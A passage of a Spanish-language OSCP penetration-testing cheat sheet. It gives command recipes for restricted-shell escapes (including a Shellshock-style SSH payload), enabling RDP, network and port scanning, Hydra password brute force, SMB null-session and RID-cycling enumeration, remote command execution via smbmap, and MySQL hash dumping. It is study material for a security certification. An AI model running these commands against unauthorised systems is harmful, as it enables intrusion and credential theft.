![alt=OSCP](./img/oscp-banner.png)

# OSCP (Offensive Security Certified Professional) CheetSheet
Apuntes para la certicación OSCP.

# Tabla de Contenido

<!-- vscode-markdown-toc -->
* 1. [Comandos](#comandos)
    * 1.1. [Linux](#linux)
        * 1.1.1. [Crunch](#crunch)
        * 1.1.2. [Escapar de una Restricted Shell](#escapar-de-una-restricted-shell)
    * 1.2. [Windows](#windows)
        * 1.2.1. [Habilitar WinRM](#habilitar-winrm)
        * 1.2.2. [ Habilitar RDP](#-habilitar-rdp)
* 2. [Docker](#docker)
* 3. [Information Gathering](#information-gathering)
    * 3.1. [Fping](#fping)
        * 3.1.1. [Identificación de hosts](#identificación-de-hosts)
    * 3.2. [Nmap](#nmap)
        * 3.2.1. [Descubrimiento de host - Ping Scan](#descubrimiento-de-host---ping-scan)
        * 3.2.2. [Escaneo de puertos](#escaneo-de-puertos)
        * 3.2.3. [Versión y Servicio](#versión-y-servicio)
        * 3.2.4. [UDP (top 100)](#udp-(top-100))
        * 3.2.5. [UDP (top 20)](#udp-(top-20))
        * 3.2.6. [Obtener ayuda sobre scripts](#obtener-ayuda-sobre-scripts)
        * 3.2.7. [Listar scripts de Nmap](#listar-scripts-de-nmap)
        * 3.2.8. [Escaneo de puertos](#escaneo-de-puertos-1)
        * 3.2.9. [Escaneo de puertos a través de proxychains usando hilos](#escaneo-de-puertos-a-través-de-proxychains-usando-hilos)
* 4. [Servicios Comunes](#servicios-comunes)
    * 4.1. [FTP (21)](#ftp-(21))
        * 4.1.1. [Nmap](#nmap-1)
        * 4.1.2. [Conexión al servidor FTP](#conexión-al-servidor-ftp)
        * 4.1.3. [Interactuar con el cliente FTP](#interactuar-con-el-cliente-ftp)
        * 4.1.4. [Netexec](#netexec)
        * 4.1.5. [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales)
        * 4.1.6. [Archivos de configuración](#archivos-de-configuración)
        * 4.1.7. [Descargar archivos](#descargar-archivos)
    * 4.2. [SMB (445)](#smb-(445))
        * 4.2.1. [Nmap](#nmap-2)
        * 4.2.2. [smbclient](#smbclient)
        * 4.2.3. [smbmap](#smbmap)
        * 4.2.4. [enum4linux](#enum4linux)
        * 4.2.5. [Netexec](#netexec-1)
        * 4.2.6. [Rpcclient](#rpcclient)
        * 4.2.7. [RID Cycling Attack](#rid-cycling-attack)
        * 4.2.8. [SMB desde Windows](#smb-desde-windows)
        * 4.2.9. [Interactuar con el cliente SMB](#interactuar-con-el-cliente-smb)
        * 4.2.10. [Montar una recurso compartido](#montar-una-recurso-compartido)
        * 4.2.11. [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales-1)
    * 4.3. [MYSQL (3306)](#mysql-(3306))
        * 4.3.1. [Nmap](#nmap-3)
        * 4.3.2. [Fuerza bruta](#fuerza-bruta)
        * 4.3.3. [Comandos básicos](#comandos-básicos)
    * 4.4. [MSSQL (1433)](#mssql-(1433))
        * 4.4.1. [Nmap](#nmap-4)
        * 4.4.2. [Netexec](#netexec-2)
        * 4.4.3. [Conexión](#conexión)
        * 4.4.4. [Comandos básicos](#comandos-básicos-1)
        * 4.4.5. [Mostrar el contenido de una base de datos](#mostrar-el-contenido-de-una-base-de-datos)
        * 4.4.6. [Ejecución de código](#ejecución-de-código)
    * 4.5. [SNMP (161 - UDP)](#snmp-(161---udp))
    * 4.6. [RDP (3389)](#rdp-(3389))
        * 4.6.1. [xfreerdp](#xfreerdp)
    * 4.7. [Netexec](#netexec-3)
* 5. [Web](#web)
    * 5.1. [Enumeración](#enumeración)
        * 5.1.1. [Fuff](#fuff)
        * 5.1.2. [Gobuster](#gobuster)
        * 5.1.3. [Wfuzz](#wfuzz)
    * 5.2. [Enumeración de CMS](#enumeración-de-cms)
        * 5.2.1. [Wordpress](#wordpress)
        * 5.2.2. [Joomla](#joomla)
        * 5.2.3. [Drupal](#drupal)
        * 5.2.4. [Magento](#magento)
* 6. [Pivoting](#pivoting)
    * 6.1. [Chisel](#chisel)
        * 6.1.1. [Servidor (Atacante)](#servidor-(atacante))
        * 6.1.2. [Cliente (Víctima)](#cliente-(víctima))
        * 6.1.3. [Socat](#socat)
    * 6.2. [Ligolo-ng](#ligolo-ng)
        * 6.2.1. [Descargar el Proxy y el Agente](#descargar-el-proxy-y-el-agente)
        * 6.2.2. [Preparar las interfaces para el tunel](#preparar-las-interfaces-para-el-tunel)
        * 6.2.3. [Configurar proxy en la máquina del atacante](#configurar-proxy-en-la-máquina-del-atacante)
        * 6.2.4. [Configurar el agente en la máquina víctima](#configurar-el-agente-en-la-máquina-víctima)
        * 6.2.5. [Configurar la sesión](#configurar-la-sesión)
* 7. [Passwords Attacks](#passwords-attacks)
* 8. [Transferencia de Archivos](#transferencia-de-archivos)
    * 8.1. [Windows](#windows-1)
    * 8.2. [Linux](#linux-1)
* 9. [Movimiento Lateral](#movimiento-lateral)
    * 9.1. [RDP](#rdp)
        * 9.1.1. [xfreerdp](#xfreerdp-1)
    * 9.2. [SMB](#smb)
        * 9.2.1. [PsExec](#psexec)
        * 9.2.2. [SharpNoPSExec](#sharpnopsexec)
        * 9.2.3. [NimExec](#nimexec)
        * 9.2.4. [psexec.py](#psexec.py)
        * 9.2.5. [smbexec.py](#smbexec.py)
        * 9.2.6. [atexec.py](#atexec.py)
    * 9.3. [WinRM](#winrm)
        * 9.3.1. [Invoke-Command](#invoke-command)
        * 9.3.2. [WINRS](#winrs)
        * 9.3.3. [Enter-PSSession](#enter-pssession)
        * 9.3.4. [NetExec](#netexec-4)
        * 9.3.5. [Evil-WinRM](#evil-winrm)
* 10. [Escalación de Privilegios](#escalación-de-privilegios)
    * 10.1. [Windows](#windows-2)
        * 10.1.1. [Enumeración](#enumeración-1)
        * 10.1.2. [Escalación de Privilegios](#escalación-de-privilegios-1)
    * 10.2. [Linux](#linux-2)
        * 10.2.1. [Enumeración](#enumeración-2)
        * 10.2.2. [Escalación de Privilegios](#escalación-de-privilegios-2)
    * 10.3. [Técnicas de explotación de trabajos Cron](#técnicas-de-explotación-de-trabajos-cron)
* 11. [Active Directory](#active-directory)
    * 11.1. [Escalación de privilegios](#escalación-de-privilegios-3)
        * 11.1.1. [Grupos Privilegiados](#grupos-privilegiados)
    * 11.2. [Kerberos](#kerberos)
    * 11.3. [Explotación](#explotación)
    * 11.4. [Movimiento Lateral](#movimiento-lateral-1)
    * 11.5. [Post Explotación](#post-explotación)
* 12. [Herramientas y Recursos](#herramientas-y-recursos)
    * 12.1. [Pivoting](#pivoting-1)
    * 12.2. [Information Gathering](#information-gathering-1)
    * 12.3. [Web](#web-1)
    * 12.4. [Bases de datos](#bases-de-datos)
    * 12.5. [Passwords Attacks](#passwords-attacks-1)
    * 12.6. [Wordlists](#wordlists)
    * 12.7. [Escalación de Privilegios](#escalación-de-privilegios-4)
    * 12.8. [Recursos y Blogs](#recursos-y-blogs)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

##  1. <a name='comandos'></a>Comandos

###  1.1. <a name='linux'></a>Linux

####  1.1.1. <a name='crunch'></a>Crunch

```bash
crunch 6 6 -t Lab%%% > wordlist
```

####  1.1.2. <a name='escapar-de-una-restricted-shell'></a>Escapar de una Restricted Shell

```bash
ssh user@10.0.0.3 -t "/bin/sh"
ssh user@10.0.0.3 -t "bash --noprofile"
ssh user@10.0.0.3 -t "(){:;}; /bin/bash"

# Vim
:set shell=/bin/bash
:shell

# more, less, man, ftp, gdb
'! /bin/sh'
'!/bin/sh'
'!bash'

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find
find / -name offsec -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# Python
exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()

# Perl
exec "/bin/sh";

# Ruby
exec "/bin/sh"

# Lua
os.execute('/bin/sh')
```

###  1.2. <a name='windows'></a>Windows

####  1.2.1. <a name='habilitar-winrm'></a>Habilitar WinRM

```powershell
winrm quickconfig
```

####  1.2.2. <a name='-habilitar-rdp'></a> Habilitar RDP

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

##  2. <a name='docker'></a>Docker

```bash
docker run                  # Corre un commando dentro de un contenedor a partir de una imágen
docker run -d               # Corre un commando dentro de un contenedor a partir de una  imágen en background (-d detached)).
docker exec                 # Ejecuta un comando dentro de un contenedor que se encuentra corriendo.
docker pull                 # Descarga una imágen
docker push                 # Sube una imágen
docker tag                  # Agrega un tag (etiqueta) a una imágen
docker images               # Lista las imagenes
docker ps                   # Lista los contenedores
docker start <id_container> # Inicializa un contenedor
docker stop  <id_container> # Detiene un contenedor
docker logs  <id_container> # Muestra el log del contenedor
docker login                # Permite iniciar sesión en dockerhub
docker build                # Construye una imágen a partir de un Dockerfile
docker network              # Permite crear una red
```

##  3. <a name='information-gathering'></a>Information Gathering

###  3.1. <a name='fping'></a>Fping

####  3.1.1. <a name='identificación-de-hosts'></a>Identificación de hosts

```bash
fping -asgq 172.16.0.1/24
```

Parámetros utilizados:

- `a` para mostrar los objetivos que están activos

- `s` imprimir estadísticas al final de la exploración

- `g` para generar una lista de destinos a partir de la red CIDR

- `q` para no mostrar resultados por objetivo

Con el escaneo realizado anteriormente con fping podemos armar una lista de hosts activos.

###  3.2. <a name='nmap'></a>Nmap

####  3.2.1. <a name='descubrimiento-de-host---ping-scan'></a>Descubrimiento de host - Ping Scan

```bash
sudo nmap -sn <TARGET-RANGE>

# Ejemplo
sudo nmap -sn 192.168.56.1/24
```

- `-sn` Esta opción le dice a Nmap que no haga un escaneo de puertos después del descubrimiento de hosts y que sólo imprima los hosts disponibles que respondieron a la traza icmp.

####  3.2.2. <a name='escaneo-de-puertos'></a>Escaneo de puertos

```bash
sudo nmap -p- --open -Pn -n <RHOST> -oG openPorts -vvv
```

Parámetros utilizados:

- `-sS`: Realiza un TCP SYN Scan para escanear de manera sigilosa, es decir, que no completa las conexiones TCP con los puertos de la máquina víctima.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `--open`: Muestra solo los puertos que están abiertos, excluyendo los cerrados.
- `--min-rate 5000`: Establece el número mínimo de paquetes que nmap enviará por segundo.
- `-Pn`: Desactiva la detección de hosts (no realiza un ping previo). Esto es útil si el host tiene el ICMP (ping) bloqueado.
- `-n`: Desactiva la resolución de nombres DNS, lo que acelera el escaneo porque no intenta resolver las direcciones IP a nombres de dominio.
- `-oG`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es un formato _grepeable_, el cual almacena todo en una sola línea. De esta forma, es más sencillo procesar y obtener los puertos abiertos por medio de expresiones regulares, en conjunto con otras utilidades como pueden ser grep, awk, sed, entre otras.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.

####  3.2.3. <a name='versión-y-servicio'></a>Versión y Servicio

```bash
sudo nmap -sCV -p<PORTS> <RHOST> -oN servicesScan -vvv 
```

- `-sCV` Es la combinación de los parámetros `-sC` y `-sV`. El primero determina que se utilizarán una serie de scripts básicos de enumeración propios de nmap, para conocer el servicio que esta corriendo en dichos puertos. Por su parte, segundo parámetro permite conocer más acerca de la versión de ese servicio.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `-oN`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es el formato por defecto de nmap.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.

####  3.2.4. <a name='udp-(top-100)'></a>UDP (top 100)

```bash
sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast <RHOST>
```

####  3.2.5. <a name='udp-(top-20)'></a>UDP (top 20)

```bash
sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 <RHOST>
```

####  3.2.6. <a name='obtener-ayuda-sobre-scripts'></a>Obtener ayuda sobre scripts

```bash
nmap --script-help="http-*"
```

####  3.2.7. <a name='listar-scripts-de-nmap'></a>Listar scripts de Nmap

```bash
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```
####  3.2.8. <a name='escaneo-de-puertos-1'></a>Escaneo de puertos

##### Descubrimiento de hosts Windows

```powershell
arp -d
for /L %a (1,1,254) do @start /b ping 40.40.40.%a -w 100 -n 2 >nul
arp -a
```
##### Descubrimiento de hosts Linux

```bash
#!/bin/bash

octetos=$(echo "$1" | grep -oE '([0-9]{1,3}\.){2}[0-9]{1,3}')

for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 $octetos.$i" &>/dev/null && echo "[+] Host $octetos.$i - ACTIVE" &
done; wait
```

```bash
./hostDiscovery.sh 192.168.56
```
##### Descubrimiento de hosts Linux (alternativa)

Si la máquina no cuenta con la utilidad `ping`, podemos utilizar el siguiente script como alternativa:

```bash
#!/bin/bash

octetos=$(echo "$1" | grep -oE '([0-9]{1,3}\.){2}[0-9]{1,3}')
 
for i in $(seq 1 254); do
    timeout 1 bash -c "echo >/dev/tcp/$octetos.$i/80" &>/dev/null && echo "[+] Host $octetos.$i - ACTIVE" &
done
wait
```

```bash
./hostDiscovery.sh 192.168.56
```
##### Descubrimiento de puertos abiertos Linux

```bash
#!/bin/bash

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/$1/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
./portDiscovery.sh <RHOST>
```
####  3.2.9. <a name='escaneo-de-puertos-a-través-de-proxychains-usando-hilos'></a>Escaneo de puertos a través de proxychains usando hilos

```bash
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -p{} -open -T5 -Pn -n <RHOST> -vvv -oN servicesScan 2>&1 | grep "tcp open"
```

##  4. <a name='servicios-comunes'></a>Servicios Comunes

###  4.1. <a name='ftp-(21)'></a>FTP (21)

El Protocolo de Transferencia de Archivos (FTP, por sus siglas en inglés) es un protocolo de red utilizado para la transferencia de archivos entre sistemas que están conectados a una red TCP/IP, basado en una arquitectura *cliente-servidor*. Este protocolo permite la transmisión eficiente de archivos a través de la red, proporcionando servicios de autenticación y control de acceso.

Por defecto, el puerto asignado para la comunicación FTP es el puerto 21.
####  4.1.1. <a name='nmap-1'></a>Nmap

Cuando lanzamos una enumeración usando Nmap, se utilizan por defecto una serie de scripts que comprueban si se permite el acceso de forma anonima.

- `anonymous:anonymous`
- `anonymous`
- `ftp:ftp`

```bash
sudo nmap -sCV -p21 <RHOST> -vvv
```

Scripts de `nmap` utiles para este servicio:

- ftp-anon
- ftp-bounce
- ftp-syst
- ftp-brute
- tftp-version

```bash
sudo nmap -p21 --script=ftp-anon <RHOST> -vvv
```

####  4.1.2. <a name='conexión-al-servidor-ftp'></a>Conexión al servidor FTP

```bash
# -A: Esta opción es específica del cliente FTP y suele utilizarse para activar 
# el modo ASCII  de transferencia de archivos. En este modo, los archivos se 
# transfieren en formato de texto, lo que significa que se pueden realizar 
# conversiones de formato (por ejemplo, de CRLF a LF en sistemas Unix).
ftp -A <RHOST>

nc -nvc <RHOST> 21

telnet <RHOST> 21
```

####  4.1.3. <a name='interactuar-con-el-cliente-ftp'></a>Interactuar con el cliente FTP

```bash
ftp> anonymous # usuario
ftp> anonymous # contraseña
ftp> help # mostrar la ayuda
ftp> help CMD # mostrar la ayuda de un comando especifico
ftp> status # descripción general de la configuración del servidor
ftp> binary # establecer la transmisión en binario en lugar de ascii
ftp> ascii # establecer la transmisión a ascii en lugar de binario
ftp> ls -a # lista todos los archivos incluyendo los ocultos
ftp> cd DIR # cambia el directorio remoto
ftp> lcd DIR # cambia el directorio local
ftp> pwd # mostrar el directorio actual de trabajo
ftp> cdup  # mover al directorio anterior de trabajo
ftp> mkdir DIR # crea un directorio
ftp> get FILE [NEWNAME] # descarga un archivo con el nombre indicado NEWNAME
ftp> mget FILE1 FILE2 ... # descarga multiples archivos
ftp> put FILE [NEWNAME] # sube un fichero local a el servidor ftp con el nuevo nombre indicado NEWNANE
ftp> mput FILE1 FILE2 ... # sube multiples archivos
ftp> rename OLD NEW # renombra un archivo remoto
ftp> delete FILE # borra un fichero
ftp> mdelete FILE1 FILE2 ... # borra multiples archivos
ftp> mdelete *.txt # borra multiples archivos que cumplan con el patrón
ftp> exit # abandona la conexión ftp
```

####  4.1.4. <a name='netexec'></a>Netexec

```bash
nxc ftp <RHOST> -u <USER> -p <PASSWORD>
nxc ftp <RHOST> -u 'anonymous' -p ''
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --port <PORT>
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --ls
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --ls <DIRECTORY>
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --get <FILE>
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --put <FILE>
```
####  4.1.5. <a name='fuerza-bruta-de-credenciales'></a>Fuerza bruta de credenciales

```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>
```

####  4.1.6. <a name='archivos-de-configuración'></a>Archivos de configuración

- `/etc/ftpusers`
- `/etc/vsftpd.conf`
- `/etc/ftp.conf`
- `/etc/proftpd.conf`

####  4.1.7. <a name='descargar-archivos'></a>Descargar archivos

```bash
wget -m ftp://anonymous:anonymous@<RHOST>
```
###  4.2. <a name='smb-(445)'></a>SMB (445)

SMB (Server Message Block) es un protocolo diseñado para la compartición de archivos en red, facilitando la interconexión de archivos y periféricos como impresoras y puertos serie entre ordenadores dentro de una red local (LAN).

- SMB utiliza el puerto 445 (TCP). Sin embargo, originalmente, SMB se ejecutaba sobre NetBIOS utilizando puerto 139.
    
- SAMBA es una implementación de código abierto para Linux del protocolo SMB (Server Message Block), que facilita la interoperabilidad entre sistemas Linux y Windows. Permite a los equipos con Windows acceder a recursos compartidos en sistemas Linux, y a su vez, posibilita que dispositivos Linux accedan a recursos compartidos en redes Windows.

El protocolo SMB utiliza dos niveles de autenticación, a saber:

- **Autenticación de usuario**: los usuarios deben proporcionar un nombre de usuario y una contraseña para autenticarse con el servidor SMB para acceder a un recurso compartido.
    
- **Autenticación de recurso compartido**: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.

####  4.2.1. <a name='nmap-2'></a>Nmap

Scripts de `nmap` utiles para este servicio:

- smb-ls
- smb-protocols
- smb-security-mode
- smb-enum-sessions
- smb-enum-shares
- smb-enum-users    
- smb-enum-groups    
- smb-enum-domains    
- smb-enum-services

Sintaxis:

```bash
sudo nmap -p445 --script <script> <RHOST>
```
####  4.2.2. <a name='smbclient'></a>smbclient

Es un cliente que nos permite acceder a recursos compartidos en servidores SMB.

```bash
# Lista recursos compartidos
smbclient -L <RHOST> -N

# Conexión utilizando una sesión nula
smbclient //<RHOST>/Public -N

# Realiza una conexión con el usuario elliot
smbclient //<RHOST>/Public -U elliot
```

####  4.2.3. <a name='smbmap'></a>smbmap

SMBMap permite a los usuarios enumerar las unidades compartidas samba en todo un dominio. Enumera las unidades compartidas, los permisos de las unidades, el contenido compartido, la funcionalidad de carga/descarga, la coincidencia de patrones de descarga automática de nombres de archivo e incluso la ejecución de comandos remotos.

```bash
# Utiliza un usuario de invitado (guest) con una contraseña en blanco para 
# autenticarse en el objetivo especificado por <RHOST>.
# -d indica el dominio actual.
smbmap -u guest -p "" -d . -H <RHOST>

# Autentica con un usuario y contraseña específicos (<USER> y <PASSWORD>) 
# en el objetivo (<RHOST>).
# -L lista los recursos compartidos disponibles en la máquina.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -L

# Autentica en el objetivo y muestra la lista de archivos y 
# carpetas en la unidad C$ de forma recursiva.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -r 'C$'

# Autentica y sube un archivo desde la ubicación local /root/file
# al recurso compartido C$ en el objetivo.
smbmap -H <RHOST> -u <USER> -p <PASSWORD> --upload '/root/file' 'tmp/file'

# Autentica y descarga el archivo 'file' desde el recurso compartido tmp 
# en el objetivo.
smbmap -H <RHOST> -u <USER> -p <PASSWORD> --download 'tmp/file'

# Autentica en el objetivo y ejecuta el comando ipconfig en el sistema remoto 
# usando SMB.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -x 'ipconfig'
```

####  4.2.4. <a name='enum4linux'></a>enum4linux

Enum4linux es una herramienta utilizada para extraer información de hosts de Windows y Samba. La herramienta está escrita en Perl y envuelta en herramientas de samba `smbclient`, `rpcclient`, `net` y `nslookup`.

```bash
# -o indica que se realizará una enumeración básica.
enum4linux -o <RHOST>

# -U indica que se realizará una enumeración de usuarios
enum4linux -U <RHOST>

# -G indica que se realizará una enumeración de grupos 
enum4linux -G <RHOST>

# -S indica que se realizará una enumeración de los recursos compartidos
enum4linux -S <RHOST>

# -i Comprueba si el servidor smb esta configurado para imprimir
enum4linux -i <RHOST>

# -r Intentará enumerar usuarios utilizando RID cycling en el sistema remoto.
# -u Especifica el nombre de usuario que se utilizará para la autenticación. 
# -p Especifica la contraseña asociada al usuario proporcionado con la opción -u.
enum4linux -r -u <user> -p <password> <RHOST>
```

####  4.2.5. <a name='netexec-1'></a>Netexec

Netexec, anteriormente conocido como **CrackMapExec (CME)**, es una herramienta de código. que permite automatizar tareas relacionadas con la enumeración y explotación de sistemas Windows y Linux, como la ejecución de comandos remotos, la obtención de credenciales y la evaluación de la seguridad en entornos de redes grandes. Netexec permite realizar tareas de forma masiva en múltiples sistemas a la vez, facilitando la identificación de vulnerabilidades y configuraciones incorrectas en una red.

```bash
# Enumerar hosts
nxc smb <RHOST>/24

# comprobar null sessions
nxc smb <RHOST> -u '' -p ''

# comprobar Guest login
nxc smb <RHOST> -u 'guest' -p ''

# enumerar hosts con firma SMB no requerida
nxc smb <RHOST>/24 --gen-relay-list relay_list.txt

# enumerar recursos compartidos usando una null session
nxc smb <RHOST> -u '' -p '' --shares

# enumerar recursos compartidos de lectura/escritura en múltiples IPs con/sin credenciales
nxc smb <RHOST> -u <USER> -p <PASSWORD> --shares --filter-shares READ WRITE

# enumera sesiones activas en la máquina objetivo
nxc smb <RHOST> -u <USER> -p <PASSWORD> --sessions

# enumera los discos duros
nxc smb <RHOST> -u <USER> -p <PASSWORD> --disks

# enumera las computadoras en el dominio
nxc smb <RHOST> -u <USER> -p <PASSWORD> --computers

# enumera los usuaros logueados
nxc smb <RHOST> -u <USER> -p <PASSWORD> --loggedon-users

# enumera usuarios del dominio
nxc smb <RHOST> -u <USER> -p <PASSWORD> --users

# enumera grupos del dominio
nxc smb <RHOST> -u <USER> -p <PASSWORD> --groups

# enumera los grupos locales de la máquina
nxc smb <RHOST> -u <USER> -p <PASSWORD> --local-group

# enumera usuarios por fuerza bruta de RID. Por defecto el valor de RID máximo es 4000.
nxc smb <RHOST> -u <USER> -p <PASSWORD> --rid-brute [MAX-RID]

# enumera la politica de contraseña
nxc smb <RHOST> -u <USER> -p <PASSWORD> --pass-pol

# emite la consulta WMI especificada
nxc smb <RHOST> -u <USER> -p <PASSWORD> --wmi

# WMI Namescape (default: root\cimv2)
nxc smb <RHOST> -u <USER> -p <PASSWORD> --wmi-namespace
```

####  4.2.6. <a name='rpcclient'></a>Rpcclient

Rpcclient es una utilidad que forma parte del conjunto de herramientas Samba. Se utiliza para interactuar con el protocolo Remote Procedure Call (RPC) de Microsoft, que se utiliza para la comunicación entre los sistemas basados en Windows y otros dispositivos. rpcclient se utiliza principalmente para fines de depuración y pruebas, y se puede utilizar para consultar y manipular sistemas remotos.

El protocolo SMB se utiliza principalmente para compartir archivos, impresoras y otros recursos en una red, pero también puede aprovechar RPC para ciertas funcionalidades y operaciones específicas.

Por ejemplo, cuando accedes a recursos compartidos en una red Windows, como carpetas compartidas o impresoras, estás utilizando el protocolo SMB. Sin embargo, para algunas operaciones administrativas y de gestión, como enumerar usuarios y grupos, modificar permisos de archivos o impresoras, o acceder a la configuración del sistema remoto, SMB puede utilizar RPC para realizar estas tareas.

Cuando utilizas herramientas como `rpcclient` para interactuar con un sistema remoto que ejecuta servicios SMB, estás esencialmente aprovechando el protocolo RPC subyacente que forma parte de la implementación de SMB en ese sistema. De esta manera, `rpcclient` puede actuar como una interfaz para realizar consultas y ejecutar comandos a través del protocolo RPC en el contexto de un servidor SMB.

```bash
# obtener información sobre el sistema remoto, como el nombre del servidor, 
# la versión del sistema operativo, el dominio de trabajo, la fecha y la hora del sistema, entre otros datos.
rpcclient -U "" -N <RHOST> -c "srvinfo"

# enumera los usuarios del dominio
rpcclient -U "" -N <RHOST> -c "enumdomusers"

# enumera los grupos del dominio
rpcclient -U "" -N <RHOST> -c "enumdomgroups"

# obtiene el SID del usuario en base a su nombre
rpcclient -U "" -N <RHOST> -c "lookupnames root"

# Se utiliza para enumerar los SID (Security Identifiers) asignados a los grupos 
# en un servidor remoto. Es útil para obtener información sobre los grupos de 
# seguridad disponibles en un sistema y sus respectivos SID.
rpcclient -U "" -N <RHOST> -c "lsaenumsid"
```

El parámetro `-c` en `rpcclient` se utiliza para especificar un comando o una secuencia de comandos que se ejecutarán en el servidor remoto una vez que se haya establecido la conexión. Esto permite realizar operaciones específicas de forma automática sin necesidad de interactuar manualmente con `rpcclient` después de establecer la conexión.

La sintaxis básica del parámetro `-c` es la siguiente:

```bash
rpcclient -U username //<RHOST> -c "command1; command2; command3"
```

####  4.2.7. <a name='rid-cycling-attack'></a>RID Cycling Attack

```bash
seq 1 5000 | xargs -P 50 -I{} rpcclient -U "" 30.30.30.4 -N -c "lookupsids S-1-22-1-{}" 2>&1
```

####  4.2.8. <a name='smb-desde-windows'></a>SMB desde Windows

```powershell
# listar recursos compartidos
net share

# borrar el recurso compartido
net use * \delete

# montar el recurso compartido
net use z: \\<RHOST>\c$ <password> /user:<username>

# /all nos permite ver los recursos compartidos administrativos (que terminan en '$').
# Puede usar IP o nombre de host para especificar el host.
net view \\<RHOST> /all
```

Recursos compartidos comunes en Windows:

- `C$` corresponde a C:/    
- `ADMIN$` se asigna a C:/Windows    
- `IPC$` se utiliza para RPC    
- `Print$` aloja controladores para impresoras compartidas    
- `SYSVOL` sólo en DCs    
- `NETLOGON` sólo en los DC

####  4.2.9. <a name='interactuar-con-el-cliente-smb'></a>Interactuar con el cliente SMB

```
smb: \> help # muestra la ayuda
smb: \> ls # listar archivos
smb: \> put file.txt # subir un archivo
smb: \> get file.txt # descargar un archivo
```

####  4.2.10. <a name='montar-una-recurso-compartido'></a>Montar una recurso compartido

```bash
mount -t cifs -o "username=user,password=password" //<RHOST>/share /mnt/share
```

####  4.2.11. <a name='fuerza-bruta-de-credenciales-1'></a>Fuerza bruta de credenciales

```bash
nmap --script smb-brute -p 445 <RHOST>
hydra -l admin -P /usr/share/wordlist/rockyou.txt <RHOST> smb
```

###  4.3. <a name='mysql-(3306)'></a>MYSQL (3306)

MySQL es un sistema de gestión de bases de datos relacional de código abierto. Es ampliamente utilizado para almacenar, gestionar y recuperar datos en diversas aplicaciones, desde sitios web hasta sistemas empresariales. MySQL es conocido por su alta performance, escalabilidad, y confiabilidad. Ofrece soporte para múltiples usuarios y transacciones simultáneas, y utiliza el lenguaje SQL (Structured Query Language) para la gestión de los datos. MySQL es compatible con numerosas plataformas y se integra fácilmente con lenguajes de programación como PHP, Java y Python.

####  4.3.1. <a name='nmap-3'></a>Nmap

Scripts de `nmap` utiles para este servicio:

- mysql-empty-password    
- mysql-info    
- mysql-databases    
- mysql-users    
- mysql-variables    
- mysql-dump-hashes    
- mysql-audit    

```bash
# Comprobar si el password de `root` es vacío.
sudo nmap --script=mysql-empty-password -p 3306 <RHOST>

# Mostrar información del servidor de MySQL
sudo nmap --script=mysql-info -p 3306 <RHOST>

# Listar las base de datos
sudo nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

# Lista los usuarios de la base de datos
sudo nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

sudo nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

# Dump hashes
sudo nmap --script=mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <RHOST>

sudo nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" <RHOST> -vvv

# Ejecutar una consulta
sudo nmap -p 3306 --script=mysql-query --script-args="query='select * from books.authors;',username='root',password=''" <RHOST> -vvv
```

####  4.3.2. <a name='fuerza-bruta'></a>Fuerza bruta

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<RHOST> mysql
```

####  4.3.3. <a name='comandos-básicos'></a>Comandos básicos

```mysql
SHOW DATABASES; # listar las bases de datos
USE <DATABASE>; # seleccionar una base de datos
SHOW TABLES; # listar las tablas de una base de datos
DESC <TABLE>; # mostar los campos de una tabla
SHOW CREATE TABLE; # mostrar la estructura de una tabla
SELECT <column_name>,<column_name>,<column_name...> FROM <TABLE>; # listar el contenido de una tabla
SHOW EVENTS; # mostrar los eventos programados
```

###  4.4. <a name='mssql-(1433)'></a>MSSQL (1433)

MSSQL, o Microsoft SQL Server, es un sistema de gestión de bases de datos relacional desarrollado por Microsoft. Es utilizado para almacenar y recuperar datos según las necesidades de diferentes aplicaciones, desde pequeñas a grandes empresas. MSSQL ofrece características avanzadas como soporte para transacciones, integridad referencial, seguridad robusta y herramientas de administración y desarrollo. Es conocido por su integración estrecha con otros productos de Microsoft, como .NET Framework y Azure, y utiliza T-SQL (Transact-SQL) como su lenguaje de consulta.

####  4.4.1. <a name='nmap-4'></a>Nmap

Scripts de `nmap` utiles para este servicio:

- ms-sql-info    
- ms-sql-ntlm-info    
